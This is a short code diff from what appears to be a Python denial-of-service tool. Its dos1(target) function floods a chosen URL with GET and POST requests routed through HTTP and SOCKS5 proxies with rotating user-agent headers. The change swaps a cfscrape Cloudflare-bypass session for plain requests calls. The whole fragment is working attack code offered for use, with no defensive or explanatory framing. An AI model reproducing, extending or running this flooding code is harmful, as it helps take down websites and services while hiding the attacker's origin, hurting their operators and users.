@@ -8,8 +8,6 @@ import pyAesCrypt
 
 os.system("clear")
 
-s = cfscrape.create_scraper()
-
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
 
@@ -50,10 +48,10 @@ def dos1(target):
             'https': f'socks5://{proxyagentsocks}'
         }
         try:
-            s.get(target, headers=header, proxies=proxieshttp)
-            s.post(target, headers=header, proxies=proxieshttp)
-            s.get(target, headers=header2, proxies=proxiessocks)
-            s.post(target, headers=header2, proxies=proxiessocks)
+            requests.get(target, headers=header, proxies=proxieshttp)
+            requests.post(target, headers=header, proxies=proxieshttp)
+            requests.get(target, headers=header2, proxies=proxiessocks)
+            requests.post(target, headers=header2, proxies=proxiessocks)
         except:
             pass
 
